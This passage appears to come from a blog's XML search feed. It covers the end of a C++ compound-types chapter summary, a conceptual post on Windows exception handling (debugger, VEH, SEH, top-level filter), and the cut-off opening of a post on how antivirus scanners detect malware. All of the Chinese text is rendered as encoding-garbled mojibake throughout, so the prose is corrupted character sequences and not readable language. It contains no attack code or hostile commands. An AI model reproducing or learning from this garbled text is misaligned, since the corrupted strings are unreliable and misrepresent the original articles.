è¿­ä»£å™¨ï¼‰ã€‚</li><li>  å¦‚æœä¸èƒ½ä½¿ç”¨ C++11 æˆ–æœ‰ç‰¹å®š C æ¥å£å…¼å®¹æ€§éœ€æ±‚ï¼Œå¯ä»¥ä½¿ç”¨ C é£æ ¼æ•°ç»„ï¼Œä½†è¦ç‰¹åˆ«æ³¨æ„å®‰å…¨æ€§å’Œå¤§å°ç®¡ç†ã€‚</li></ul></li><li>  <strong>æ€§èƒ½å…³é”®ä¸”å¤§å°å›ºå®š:</strong> <code>std::array</code> å’Œ C é£æ ¼æ•°ç»„é€šå¸¸æ€§èƒ½æœ€ä½³ã€‚</li></ul><p>æ€»çš„æ¥è¯´ï¼Œåœ¨ç°ä»£ C++ ä¸­ï¼Œåº”ä¼˜å…ˆä½¿ç”¨ <code>std::vector</code> å’Œ <code>std::array</code> è€Œä¸æ˜¯ C é£æ ¼æ•°ç»„ï¼Œä»¥è·å¾—æ›´å¥½çš„ç±»å‹å®‰å…¨ã€å†…å­˜ç®¡ç†å’Œæ˜“ç”¨æ€§ã€‚</p><h2 id="4-11-æ€»ç»“"><a href="#4-11-æ€»ç»“" class="headerlink" title="4.11 æ€»ç»“"></a>4.11 æ€»ç»“</h2><p>æœ¬ç« ä»‹ç»äº†C++çš„**å¤åˆç±»å‹ (Compound Types)**ï¼Œå®ƒä»¬å…è®¸æˆ‘ä»¬å°†å¤šä¸ªå€¼ç»„åˆæˆä¸€ä¸ªæ•°æ®å•å…ƒã€‚</p><p>æˆ‘ä»¬é¦–å…ˆå­¦ä¹ äº†**æ•°ç»„ (Array)**ï¼Œå®ƒç”¨äºå­˜å‚¨ä¸€ç³»åˆ—ç›¸åŒç±»å‹çš„æ•°æ®ã€‚æˆ‘ä»¬äº†è§£äº†å¦‚ä½•å£°æ˜æ•°ç»„ã€ä½¿ç”¨ç´¢å¼•è®¿é—®å…ƒç´ ï¼ˆä»0å¼€å§‹ï¼‰ï¼Œä»¥åŠåˆå§‹åŒ–æ•°ç»„çš„å„ç§è§„åˆ™ï¼ŒåŒ…æ‹¬C++11å¼•å…¥çš„æ›´å®‰å…¨çš„åˆ—è¡¨åˆå§‹åŒ–æ–¹æ³•ã€‚æˆ‘ä»¬å¼ºè°ƒäº†æ•°ç»„å¤§å°å¿…é¡»æ˜¯å¸¸é‡è¡¨è¾¾å¼ï¼Œå¹¶ä¸”è®¿é—®æ•°ç»„æ—¶éœ€è¦æ³¨æ„è¾¹ç•Œï¼Œé¿å…è¶Šç•Œè®¿é—®ã€‚</p><p>æ¥ç€ï¼Œæˆ‘ä»¬æ¢è®¨äº†å¤„ç†æ–‡æœ¬æ•°æ®çš„ä¸¤ç§æ–¹å¼ã€‚ç¬¬ä¸€ç§æ˜¯ä¼ ç»Ÿçš„<strong>Cé£æ ¼å­—ç¬¦ä¸²</strong>ï¼Œå³ä»¥ç©ºå­—ç¬¦ <code>\0</code> ç»“å°¾çš„ <code>char</code> æ•°ç»„ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•æ‹¼æ¥å­—ç¬¦ä¸²å¸¸é‡ã€åœ¨æ•°ç»„ä¸­ä½¿ç”¨å­—ç¬¦ä¸²ã€ä»¥åŠä½¿ç”¨ <code>cin</code> å’Œ <code>getline</code> è¯»å–å­—ç¬¦ä¸²è¾“å…¥ï¼Œå¹¶ç‰¹åˆ«æ³¨æ„äº†æ··åˆè¾“å…¥æ•°å­—å’Œæ•´è¡Œå­—ç¬¦ä¸²æ—¶å¯èƒ½é‡åˆ°çš„é—®é¢˜ã€‚</p><p>ç¬¬äºŒç§ï¼Œä¹Ÿæ˜¯C++ä¸­æ›´æ¨èçš„æ–¹å¼ï¼Œæ˜¯ä½¿ç”¨æ ‡å‡†åº“æä¾›çš„ <strong><code>string</code> ç±»</strong>ã€‚<code>string</code> ç±»æä¾›äº†è‡ªåŠ¨å†…å­˜ç®¡ç†ã€æ–¹ä¾¿çš„èµ‹å€¼ã€æ‹¼æ¥ (<code>+</code>) å’Œé™„åŠ  (<code>+=</code>) æ“ä½œï¼Œä»¥åŠå¤§é‡ç”¨äºæŸ¥æ‰¾ã€ä¿®æ”¹ã€æ¯”è¾ƒå’Œè®¿é—®å­—ç¬¦çš„æˆå‘˜å‡½æ•°ã€‚æˆ‘ä»¬è¿˜å­¦ä¹ äº†å¦‚ä½•ä½¿ç”¨ <code>cin</code>, <code>cout</code>, å’Œ <code>getline</code> å¯¹ <code>string</code> å¯¹è±¡è¿›è¡Œè¾“å…¥è¾“å‡ºï¼Œå¹¶äº†è§£äº†C++11å¼•å…¥çš„åŸå§‹å­—ç¬¦ä¸²å­—é¢å€¼å’ŒUnicodeå­—ç¬¦ä¸²å­—é¢å€¼ã€‚</p><p><strong>ç»“æ„ (Structure)</strong> è¢«å¼•å…¥ä½œä¸ºä¸€ç§åˆ›å»ºè‡ªå®šä¹‰å¤åˆç±»å‹çš„æ–¹å¼ï¼Œå…è®¸å°†ä¸åŒç±»å‹çš„æ•°æ®é¡¹ï¼ˆæˆå‘˜ï¼‰ç»„åˆåœ¨ä¸€èµ·ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•å®šä¹‰ç»“æ„ã€å£°æ˜ç»“æ„å˜é‡ã€ä½¿ç”¨ç‚¹è¿ç®—ç¬¦ (<code>.</code>) è®¿é—®æˆå‘˜ï¼Œä»¥åŠC++11çš„åˆ—è¡¨åˆå§‹åŒ–ã€‚æˆ‘ä»¬è¿˜çœ‹åˆ°ç»“æ„ä½“å¯ä»¥åŒ…å« <code>string</code> å¯¹è±¡æˆ–æ•°ç»„ä½œä¸ºæˆå‘˜ï¼Œç»“æ„å˜é‡å¯ä»¥ç›¸äº’èµ‹å€¼ï¼Œå¯ä»¥ä½œä¸ºå‡½æ•°å‚æ•°ï¼ˆæŒ‰å€¼ã€æŒ‰å¼•ç”¨ã€æŒ‰æŒ‡é’ˆï¼‰å’Œè¿”å›å€¼ã€‚<strong>ç»“æ„æ•°ç»„</strong>å…è®¸æˆ‘ä»¬ç®¡ç†ä¸€ç»„ç»“æ„å¯¹è±¡ï¼Œè€Œ<strong>ä½å­—æ®µ</strong>åˆ™æä¾›äº†ä¸€ç§åœ¨ç»“æ„å†…ç²¾ç¡®æ§åˆ¶æˆå‘˜å ç”¨ä½æ•°çš„æ–¹å¼ã€‚</p><p><strong>å…±ç”¨ä½“ (Union)</strong> ä½œä¸ºå¦ä¸€ç§å¤åˆç±»å‹è¢«ä»‹ç»ï¼Œå…¶ç‰¹ç‚¹æ˜¯æ‰€æœ‰æˆå‘˜å…±äº«åŒä¸€å—å†…å­˜ç©ºé—´ï¼Œä¸»è¦ç”¨äºèŠ‚çœå†…å­˜æˆ–è¿›è¡Œç±»å‹åŒå…³ï¼ˆéœ€è°¨æ…ï¼‰ã€‚æˆ‘ä»¬äº†è§£äº†å¦‚ä½•å®šä¹‰å’Œè®¿é—®å…±ç”¨ä½“ï¼Œä»¥åŠä½¿ç”¨åŒ¿åå…±ç”¨ä½“ã€‚</p><p><strong>æšä¸¾ (Enum)</strong> æä¾›äº†ä¸€ç§åˆ›å»ºå…·åæ•´æ•°å¸¸é‡çš„æ–¹å¼ï¼Œæé«˜äº†ä»£ç çš„å¯è¯»æ€§å’Œç±»å‹å®‰å…¨ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•å®šä¹‰æšä¸¾ã€æ˜¾å¼è®¾ç½®æšä¸¾é‡çš„å€¼ã€æšä¸¾çš„å–å€¼èŒƒå›´ï¼Œå¹¶ç®€è¦ä»‹ç»äº†C++11å¼•å…¥çš„æ›´å®‰å…¨çš„**ä½œç”¨åŸŸå†…æšä¸¾ (<code>enum class</code>)**ã€‚</p><p>æœ¬ç« çš„ä¸€ä¸ªæ ¸å¿ƒå†…å®¹æ˜¯<strong>æŒ‡é’ˆ (Pointer)</strong> å’Œ**è‡ªç”±å­˜å‚¨ç©ºé—´ (Free Store / Heap)**ã€‚æŒ‡é’ˆæ˜¯å­˜å‚¨å†…å­˜åœ°å€çš„å˜é‡ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•å£°æ˜å’Œåˆå§‹åŒ–æŒ‡é’ˆï¼ˆåŒ…æ‹¬ä½¿ç”¨ <code>&amp;</code> è·å–åœ°å€å’Œåˆå§‹åŒ–ä¸º <code>nullptr</code>ï¼‰ï¼Œå¦‚ä½•ä½¿ç”¨è§£å¼•ç”¨è¿ç®—ç¬¦ <code>*</code> è®¿é—®æŒ‡é’ˆæŒ‡å‘çš„å€¼ï¼Œå¹¶å¼ºè°ƒäº†ä½¿ç”¨æœªåˆå§‹åŒ–æŒ‡é’ˆã€ç©ºæŒ‡é’ˆæˆ–æ‚¬æŒ‚æŒ‡é’ˆçš„å±é™©ã€‚</p><p>æˆ‘ä»¬å­¦ä¹ äº†ä½¿ç”¨ <code>new</code> è¿ç®—ç¬¦åœ¨è‡ªç”±å­˜å‚¨åŒºåŠ¨æ€åˆ†é…å†…å­˜ï¼ˆç”¨äºå•ä¸ªå˜é‡æˆ–å¯¹è±¡ï¼‰ï¼Œä»¥åŠä½¿ç”¨ <code>delete</code> è¿ç®—ç¬¦é‡Šæ”¾è¿™äº›å†…å­˜ã€‚åŒæ ·ï¼Œæˆ‘ä»¬å­¦ä¹ äº†ä½¿ç”¨ <code>new[]</code> åŠ¨æ€åˆ†é…æ•°ç»„ï¼Œå¹¶å¼ºè°ƒ<strong>å¿…é¡»</strong>ä½¿ç”¨ <code>delete[]</code> æ¥é‡Šæ”¾åŠ¨æ€æ•°ç»„å†…å­˜ã€‚æ­£ç¡®é…å¯¹ <code>new</code>/<code>delete</code> å’Œ <code>new[]</code>/<code>delete[]</code> å¯¹äºé¿å…å†…å­˜æ³„æ¼å’Œç¨‹åºå´©æºƒè‡³å…³é‡è¦ã€‚</p><p>æŒ‡é’ˆä¸æ•°ç»„çš„ç´§å¯†å…³ç³»ä»¥åŠ<strong>æŒ‡é’ˆç®—æœ¯</strong>ä¹Ÿè¢«è¯¦ç»†è®¨è®ºã€‚æ•°ç»„åé€šå¸¸å¯è§†ä¸ºæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆï¼ŒæŒ‡é’ˆç®—æœ¯å…è®¸åœ¨æ•°ç»„å…ƒç´ é—´ç§»åŠ¨ã€‚æˆ‘ä»¬è¿˜çœ‹åˆ°äº†å¦‚ä½•ä½¿ç”¨æŒ‡é’ˆå¤„ç†Cé£æ ¼å­—ç¬¦ä¸²ï¼Œä»¥åŠå¦‚ä½•åŠ¨æ€åˆ›å»ºç»“æ„å¹¶ä½¿ç”¨ç®­å¤´è¿ç®—ç¬¦ (<code>-&gt;</code>) é€šè¿‡æŒ‡é’ˆè®¿é—®å…¶æˆå‘˜ã€‚æœ€åï¼Œæˆ‘ä»¬åŒºåˆ†äº†ä¸‰ç§ä¸»è¦çš„å­˜å‚¨æŒç»­æ€§ï¼šè‡ªåŠ¨å­˜å‚¨ï¼ˆæ ˆï¼‰ã€é™æ€å­˜å‚¨å’ŒåŠ¨æ€å­˜å‚¨ï¼ˆå †ï¼‰ã€‚</p><p>æˆ‘ä»¬è¿˜æ¢è®¨äº†å¦‚ä½•<strong>ç»„åˆ</strong>è¿™äº›ç±»å‹ï¼Œä¾‹å¦‚åˆ›å»ºåŒ…å«æ•°ç»„æˆ–æŒ‡é’ˆæˆå‘˜çš„ç»“æ„ã€æŒ‡é’ˆæ•°ç»„ä»¥åŠæŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆï¼Œä»¥æ„å»ºæ›´å¤æ‚çš„æ•°æ®è¡¨ç¤ºã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬ä»‹ç»äº†C++æ ‡å‡†åº“æä¾›çš„å†…ç½®æ•°ç»„çš„ç°ä»£æ›¿ä»£å“ï¼š**<code>std::vector</code>**ï¼ˆåŠ¨æ€å¤§å°æ•°ç»„ï¼‰å’Œ **<code>std::array</code>**ï¼ˆå›ºå®šå¤§å°æ•°ç»„ï¼ŒC++11ï¼‰ã€‚å®ƒä»¬æä¾›äº†æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„æ¥å£å’Œè‡ªåŠ¨å†…å­˜ç®¡ç†ï¼ˆå¯¹äº <code>vector</code>ï¼‰ï¼Œæ˜¯ç°ä»£C++ç¼–ç¨‹ä¸­æ¨èçš„é€‰æ‹©ã€‚</p><p>é€šè¿‡æœ¬ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬æŒæ¡äº†åˆ›å»ºå’Œä½¿ç”¨å„ç§å¤åˆæ•°æ®ç±»å‹ä»¥åŠè¿›è¡ŒåŠ¨æ€å†…å­˜ç®¡ç†çš„åŸºæœ¬æŠ€èƒ½ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså¼‚å¸¸å¤„ç†æœºåˆ¶æ·±åº¦è§£æ</title>
      <link href="2025/03/31/windows_exception/"/>
      <url>2025/03/31/windows_exception/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯Windowså¼‚å¸¸"><a href="#ä»€ä¹ˆæ˜¯Windowså¼‚å¸¸" class="headerlink" title="ä»€ä¹ˆæ˜¯Windowså¼‚å¸¸"></a>ä»€ä¹ˆæ˜¯Windowså¼‚å¸¸</h2><p>Windowså¼‚å¸¸æ˜¯æŒ‡åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­é‡åˆ°çš„éæ­£å¸¸æƒ…å†µï¼Œè¿™äº›æƒ…å†µä¼šä¸­æ–­ç¨‹åºæ­£å¸¸çš„æ‰§è¡Œæµç¨‹ã€‚Windowsæ“ä½œç³»ç»Ÿæä¾›äº†å®Œå–„çš„å¼‚å¸¸å¤„ç†æœºåˆ¶æ¥åº”å¯¹è¿™äº›æƒ…å†µï¼Œä½¿ç¨‹åºèƒ½å¤Ÿä¼˜é›…åœ°å¤„ç†é”™è¯¯å¹¶å°½å¯èƒ½æ¢å¤æ­£å¸¸è¿è¡Œã€‚</p><p>ä»æœ¬è´¨ä¸Šçœ‹ï¼ŒWindowså¼‚å¸¸å¯åˆ†ä¸ºä¸¤å¤§ç±»ï¼šç¡¬ä»¶å¼‚å¸¸å’Œè½¯ä»¶å¼‚å¸¸ã€‚ç¡¬ä»¶å¼‚å¸¸ç”±CPUç›´æ¥äº§ç”Ÿï¼Œå¦‚å†…å­˜è®¿é—®è¿è§„ã€é™¤é›¶é”™è¯¯ç­‰ï¼›è€Œè½¯ä»¶å¼‚å¸¸åˆ™æ˜¯ç”±ç¨‹åºä»£ç ä¸»åŠ¨è§¦å‘ï¼Œå¦‚C++çš„throwè¯­å¥ã€Windows APIä¸­çš„RaiseExceptionå‡½æ•°ç­‰ã€‚</p><h2 id="å¸¸è§çš„å¼‚å¸¸è§¦å‘æƒ…å†µåŠç°è±¡"><a href="#å¸¸è§çš„å¼‚å¸¸è§¦å‘æƒ…å†µåŠç°è±¡" class="headerlink" title="å¸¸è§çš„å¼‚å¸¸è§¦å‘æƒ…å†µåŠç°è±¡"></a>å¸¸è§çš„å¼‚å¸¸è§¦å‘æƒ…å†µåŠç°è±¡</h2><p>åœ¨æ—¥å¸¸ç¼–ç¨‹å’Œç³»ç»Ÿä½¿ç”¨ä¸­ï¼Œå¼‚å¸¸å¯èƒ½ç”±å¤šç§æƒ…å†µè§¦å‘ã€‚å†…å­˜è®¿é—®è¿è§„æ˜¯ä¸€ç§å¸¸è§æƒ…å†µï¼ŒåŒ…æ‹¬è®¿é—®ç©ºæŒ‡é’ˆï¼ˆ0x00000000ï¼‰ã€è®¿é—®å·²é‡Šæ”¾çš„å†…å­˜æˆ–å°è¯•å†™å…¥åªè¯»å†…å­˜åŒºåŸŸã€‚è®¡ç®—å¼‚å¸¸ä¹Ÿæ—¶æœ‰å‘ç”Ÿï¼Œå¦‚é™¤é›¶æ“ä½œã€æ•´æ•°æº¢å‡ºæˆ–æµ®ç‚¹è¿ç®—é”™è¯¯ã€‚éæ³•æŒ‡ä»¤å¼‚å¸¸åˆ™å¯èƒ½æºäºæ‰§è¡Œæ— æ•ˆæˆ–ç‰¹æƒæŒ‡ä»¤ï¼Œæˆ–æ˜¯é”™è¯¯åœ°æ‰§è¡Œæ•°æ®åŒºåŸŸçš„å†…å®¹ã€‚æ­¤å¤–ï¼Œè¿˜æœ‰ç¨‹åºé€šè¿‡RaiseException APIã€C++çš„throwè¯­å¥æˆ–.NETä¸­çš„throwæŒ‡ä»¤ä¸»åŠ¨æŠ›å‡ºçš„å¼‚å¸¸ã€‚</p><p><img src="https://s2.loli.net/2025/03/31/Zv4nF21k9QtxNm5.jpg" class="lazyload" data-srcset="https://s2.loli.net/2025/03/31/Zv4nF21k9QtxNm5.jpg" srcset="data:image/png;base64,666" alt="exception.jpg"></p><p>è¿™äº›å¼‚å¸¸è§¦å‘æ—¶ï¼Œç”¨æˆ·å¯èƒ½ä¼šçœ‹åˆ°ä¸åŒçš„ç°è±¡ï¼šåº”ç”¨ç¨‹åºå´©æºƒå¹¶æ˜¾ç¤ºâ€XXXå·²åœæ­¢å·¥ä½œâ€çš„å¯¹è¯æ¡†ï¼›Windowsé”™è¯¯æŠ¥å‘Šå·¥å…·å¼¹å‡ºï¼›ç¨‹åºæ— é¢„è­¦åœ°ç»ˆæ­¢è¿è¡Œï¼›åœ¨è°ƒè¯•ç¯å¢ƒä¸­è§¦å‘æ–­ç‚¹ï¼›ç”šè‡³åœ¨ä¸¥é‡çš„å†…æ ¸æ¨¡å¼å¼‚å¸¸æƒ…å†µä¸‹å¯¼è‡´ç³»ç»Ÿè“å±ã€‚è¿™äº›ç°è±¡éƒ½æ˜¯Windowså¼‚å¸¸å¤„ç†æœºåˆ¶å·¥ä½œçš„å¤–åœ¨è¡¨ç°ã€‚</p><h2 id="Windowså¼‚å¸¸å¤„ç†æµç¨‹"><a href="#Windowså¼‚å¸¸å¤„ç†æµç¨‹" class="headerlink" title="Windowså¼‚å¸¸å¤„ç†æµç¨‹"></a>Windowså¼‚å¸¸å¤„ç†æµç¨‹</h2><p>å½“å¼‚å¸¸å‘ç”Ÿæ—¶ï¼ŒWindowsä¼šæŒ‰ç…§ä¸€ä¸ªä¸¥æ ¼çš„é¡ºåºå°è¯•å¤„ç†å¼‚å¸¸ã€‚é¦–å…ˆæ˜¯å¼‚å¸¸çš„è§¦å‘ï¼ŒCPUæ£€æµ‹åˆ°å¼‚å¸¸æ¡ä»¶å¹¶ç”Ÿæˆä¸­æ–­ã€‚å¦‚æœç¨‹åºåœ¨è°ƒè¯•å™¨ä¸‹è¿è¡Œï¼Œè°ƒè¯•å™¨æ‹¥æœ‰ç¬¬ä¸€ä¼˜å…ˆæƒæ¥å¤„ç†è¿™ä¸ªå¼‚å¸¸ï¼Œè¿™ä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿåœ¨å¼‚å¸¸å‘ç”Ÿçš„ç¬¬ä¸€æ—¶é—´åˆ†æé—®é¢˜ã€‚</p><p>è‹¥æ— è°ƒè¯•å™¨æˆ–è°ƒè¯•å™¨é€‰æ‹©ä¸å¤„ç†ï¼Œç³»ç»Ÿä¼šè°ƒç”¨å·²æ³¨å†Œçš„å‘é‡åŒ–å¼‚å¸¸å¤„ç†å‡½æ•°ï¼ˆVectored Exception Handlersï¼ŒVEHï¼‰ã€‚æ¥ä¸‹æ¥ï¼Œå¦‚æœå¼‚å¸¸ä»æœªè¢«å¤„ç†ï¼Œç³»ç»Ÿä¼šéå†å½“å‰çº¿ç¨‹çš„ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆStructured Exception Handlingï¼ŒSEHï¼‰é“¾ï¼ŒæŸ¥æ‰¾èƒ½å¤Ÿå¤„ç†è¯¥å¼‚å¸¸çš„å¤„ç†å™¨ã€‚</p><p>å½“SEHé“¾ä¸­æ²¡æœ‰åˆé€‚çš„å¤„ç†å™¨æ—¶ï¼Œç³»ç»Ÿä¼šè°ƒç”¨é¡¶å±‚å¼‚å¸¸è¿‡æ»¤å™¨ï¼ˆUnhandledExceptionFilterå‡½æ•°ï¼‰ä½œä¸ºæœ€åçš„åº”ç”¨ç¨‹åºçº§é˜²çº¿ã€‚å¦‚æœæ‰€æœ‰è¿™äº›æœºåˆ¶éƒ½æ— æ³•å¤„ç†å¼‚å¸¸ï¼Œç³»ç»Ÿå°†æ¥ç®¡å¹¶æ‰§è¡Œé»˜è®¤å¤„ç†ï¼šæ˜¾ç¤ºé”™è¯¯å¯¹è¯æ¡†å¹¶ç»ˆæ­¢è¿›ç¨‹ã€‚è¿™ç§å±‚å±‚é€’è¿›çš„è®¾è®¡ç¡®ä¿äº†å¼‚å¸¸èƒ½å¤Ÿåœ¨æœ€é€‚å½“çš„å±‚æ¬¡è¢«å¤„ç†ï¼ŒåŒæ—¶æä¾›äº†å¤šé‡ä¿éšœæœºåˆ¶ã€‚</p><p>å³ï¼š<code>å¼‚å¸¸è§¦å‘ -- è°ƒè¯•å™¨ï¼ˆè‹¥å­˜åœ¨ï¼‰ -- å·²æ³¨å†Œçš„VEHå¤„ç†å‡½æ•°ï¼ˆå½±å“æ•´ä¸ªè¿›ç¨‹ï¼‰ -- éå†çº¿ç¨‹çš„SEHé“¾ï¼ˆå½±å“å•ä¸ªçº¿ç¨‹ï¼‰ -- é¡¶å±‚å¼‚å¸¸è¿‡æ»¤å™¨ï¼ˆå…œåº•ï¼‰ -- ç³»ç»Ÿé»˜è®¤å¤„ç†</code></p><h2 id="å¼‚å¸¸å¤„ç†å„ç¯èŠ‚çš„ä½œç”¨åŠåŒºåˆ«"><a href="#å¼‚å¸¸å¤„ç†å„ç¯èŠ‚çš„ä½œç”¨åŠåŒºåˆ«" class="headerlink" title="å¼‚å¸¸å¤„ç†å„ç¯èŠ‚çš„ä½œç”¨åŠåŒºåˆ«"></a>å¼‚å¸¸å¤„ç†å„ç¯èŠ‚çš„ä½œç”¨åŠåŒºåˆ«</h2><p>è°ƒè¯•å™¨å¤„ç†æ˜¯å¼‚å¸¸å¤„ç†æµç¨‹çš„ç¬¬ä¸€å…³å¡ã€‚è°ƒè¯•å™¨æ‹¥æœ‰å¤„ç†å¼‚å¸¸çš„æœ€é«˜ä¼˜å…ˆçº§ï¼Œå¯ä»¥åœ¨å¼‚å¸¸å‘ç”Ÿçš„ç¬¬ä¸€æ—¶é—´æ•è·å¹¶æš‚åœç¨‹åºæ‰§è¡Œã€‚è¿™ä¸€ç¯èŠ‚çš„ç‹¬ç‰¹ä¹‹å¤„åœ¨äºå®ƒèƒ½å¤Ÿå±•ç¤ºå¼‚å¸¸å‘ç”Ÿæ—¶çš„å®Œæ•´ä¸Šä¸‹æ–‡ï¼Œå…è®¸å¼€å‘è€…ä¿®æ”¹ç¨‹åºçŠ¶æ€åç»§ç»­æ‰§è¡Œã€‚å¼‚å¸¸åœ¨è°ƒè¯•å™¨ä¸­åˆ†ä¸ºä¸€æ¬¡æœºä¼šå’ŒäºŒæ¬¡æœºä¼šå¼‚å¸¸ï¼Œä¸ºè°ƒè¯•æä¾›äº†çµæ´»æ€§ã€‚</p><p>å‘é‡åŒ–å¼‚å¸¸å¤„ç†ï¼ˆVEHï¼‰æä¾›äº†ä¸€ç§å…¨å±€æ€§çš„å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œå…¶æœ€å¤§ç‰¹ç‚¹æ˜¯ä¸å—å‡½æ•°è°ƒç”¨å †æ ˆçš„é™åˆ¶ã€‚å¼€å‘è€…å¯ä»¥é€šè¿‡AddVectoredExceptionHandler APIæ³¨å†Œå¤„ç†å‡½æ•°ï¼Œç³»ç»Ÿä¼šæŒ‰æ³¨å†Œé¡ºåºæˆ–ååºè°ƒç”¨æ‰€æœ‰å¤„ç†å‡½æ•°ã€‚VEHç‰¹åˆ«é€‚åˆå…¨å±€é”™è¯¯ç›‘æ§ã€æ—¥å¿—è®°å½•ç­‰åœºæ™¯ï¼Œä¸”ä¸éœ€è¦åœ¨ä»£ç ä¸­æ·»åŠ ç‰¹æ®Šçš„è¯­è¨€ç»“æ„ï¼ˆå¦‚try/exceptï¼‰ã€‚</p><p>ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆSEHï¼‰æ˜¯Windowsä¼ ç»Ÿçš„æ ¸å¿ƒå¼‚å¸¸å¤„ç†æ–¹å¼ï¼Œæä¾›äº†åŸºäºè°ƒç”¨æ ˆçš„å¼‚å¸¸ä¿æŠ¤æœºåˆ¶ã€‚å®ƒé€šè¿‡<code>__try/__except/__finally</code>å—å®ç°ï¼Œé‡‡ç”¨é“¾è¡¨ç»“æ„å¹¶ä¸å‡½æ•°è°ƒç”¨å †æ ˆç´§å¯†å…³è”ã€‚SEHéµå¾ªâ€å…ˆæ³¨å†Œåä½¿ç”¨â€çš„LIFOåŸåˆ™ï¼Œè¿™æ„å‘³ç€æœ€è¿‘è®¾ç½®çš„å¼‚å¸¸å¤„ç†å™¨ä¼šé¦–å…ˆè¢«è°ƒç”¨ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒC++å¼‚å¸¸å¤„ç†æœºåˆ¶åœ¨Windowså¹³å°çš„åº•å±‚å®ç°ä¹Ÿæ˜¯åŸºäºSEHçš„ã€‚</p><p>é¡¶å±‚å¼‚å¸¸è¿‡æ»¤å™¨ä½œä¸ºåº”ç”¨ç¨‹åºçº§åˆ«çš„æœ€åé˜²çº¿ï¼Œè´Ÿè´£å¤„ç†æ‰€æœ‰æœªè¢«æ•è·çš„å¼‚å¸¸ã€‚é€šè¿‡SetUnhandledExceptionFilter APIï¼Œæ¯ä¸ªè¿›ç¨‹å¯ä»¥è®¾ç½®ä¸€ä¸ªé¡¶å±‚å¼‚å¸¸è¿‡æ»¤å™¨ã€‚è¿™ä¸€æœºåˆ¶å¸¸ç”¨äºå®ç°å´©æºƒè½¬å‚¨åŠŸèƒ½ï¼Œæ˜¯æ„å»ºè‡ªå®šä¹‰åº”ç”¨ç¨‹åºé”™è¯¯æŠ¥å‘Šç³»ç»Ÿçš„ç†æƒ³é€‰æ‹©ã€‚</p><p>å½“æ‰€æœ‰ç”¨æˆ·å®šä¹‰çš„å¼‚å¸¸å¤„ç†å™¨éƒ½æ— æ³•å¤„ç†å¼‚å¸¸æ—¶ï¼Œæ“ä½œç³»ç»Ÿçš„é»˜è®¤å¤„ç†æœºåˆ¶æ¥ç®¡ã€‚ç³»ç»Ÿä¼šæ˜¾ç¤ºåº”ç”¨ç¨‹åºé”™è¯¯å¯¹è¯æ¡†ï¼Œå¯èƒ½ç”Ÿæˆé”™è¯¯æŠ¥å‘Šå‘é€åˆ°Microsoftï¼Œå¹¶ç»ˆæ­¢å‘ç”Ÿå¼‚å¸¸çš„è¿›ç¨‹ï¼Œé‡Šæ”¾å…¶å ç”¨çš„èµ„æºã€‚è¿™æ˜¯ä¿è¯ç³»ç»Ÿç¨³å®šæ€§çš„æœ€åä¸€é“é˜²çº¿ã€‚</p><p>é€šè¿‡è¿™ç§åˆ†å±‚çš„å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼ŒWindowsæä¾›äº†å¼ºå¤§è€Œçµæ´»çš„é”™è¯¯å¤„ç†èƒ½åŠ›ï¼Œæ—¢é€‚åˆå¼€å‘äººå‘˜è¿›è¡Œè°ƒè¯•ï¼Œä¹Ÿèƒ½ä¸ºæœ€ç»ˆç”¨æˆ·æä¾›è¾ƒå¥½çš„é”™è¯¯æ¢å¤ä½“éªŒã€‚å¯¹äºå®‰å…¨ç ”ç©¶äººå‘˜æ¥è¯´ï¼Œæ·±å…¥ç†è§£è¿™å¥—æœºåˆ¶å¯¹äºæ¼æ´åˆ†æå’Œåˆ©ç”¨åŒæ ·å…·æœ‰é‡è¦æ„ä¹‰ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç—…æ¯’æ‰«æèƒŒåçš„ç§˜å¯†ï¼šä»ç‰¹å¾ç åˆ°æ™ºèƒ½é˜²å¾¡çš„æŠ€æœ¯æ­ç§˜</title>
      <link href="2025/03/31/virus_defence/"/>
      <url>2025/03/31/virus_defence/</url>
      
        <content type="html"><![CDATA[<p>åœ¨æ•°å­—ä¸–ç•Œä¸­ï¼Œç—…æ¯’ä¸æ€æ¯’è½¯ä»¶çš„å¯¹æŠ—ä»æœªåœæ­‡ã€‚è¦å®ç°ç²¾å‡†çš„ç—…æ¯’æŸ¥æ€ï¼Œæ ¸å¿ƒä¾èµ–äºä¸‰å¤§æŠ€æœ¯ï¼š<strong>ç—…æ¯’ç‰¹å¾ç è¯†åˆ«</strong>ã€<strong>è¡Œä¸ºç›‘æ§</strong>ä»¥åŠ<strong>å¯å‘å¼åˆ†æ</strong>ã€‚æœ¬æ–‡å°†è§£æè¿™äº›æŠ€æœ¯çš„åŸç†ä¸å®ç°æ–¹å¼ï¼Œæ­å¼€ç—…æ¯’æ‰«æèƒŒåçš„åŸç†ã€‚</p><hr><h2 id="ç—…æ¯’æ‰«æçš„æ ¸å¿ƒï¼šç‰¹å¾ç æ£€æµ‹"><a href="#ç—…æ¯’æ‰«æçš„æ ¸å¿ƒï¼šç‰¹å¾ç æ£€æµ‹" class="headerlink" title="ç—…æ¯’æ‰«æçš„æ ¸å¿ƒï¼šç‰¹å¾ç æ£€æµ‹"></a>ç—…æ¯’æ‰«æçš„æ ¸å¿ƒï¼šç‰¹å¾ç æ£€æµ‹</h2><h3 id="ç‰¹å¾ç æ£€æµ‹çš„å®ç°è¿‡ç¨‹"><a 